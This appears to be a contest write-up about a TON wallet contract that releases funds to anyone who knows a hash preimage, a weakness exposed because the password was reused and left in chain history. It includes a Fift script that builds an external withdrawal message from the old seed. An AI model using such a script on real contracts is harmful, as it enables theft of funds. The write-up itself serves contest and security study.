# Wallet
The idea behind this contract is that to spend money you need to know the preimage of the image saved in the contract, something like a one-time password.
Obviously, it is unsafe in many ways: for instance, any relay party may change the request prior to it being included in the block, however, on practice it may work for a while.

The problem with the contract on the contest is that the current password was previously reused, thus it can be found in history and used to withdraw funds.

The following script will do the trick.

```fift

"TonUtil.fif" include

<b 0 256 u, b> <s =: old_seed
<b -1 256 i, b> <s =: new_seed

<b b{1000100} s, contract_address addr, 0 Gram, b{00} s, =: envelope

<b 0x18 6 u, contract_address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message1

envelope old_seed s, 128 8 u, message1 ref, new_seed shash 256 B>u@ 256 u, b> 2 boc+>B

"external-message-withdraw.boc" B>file

```
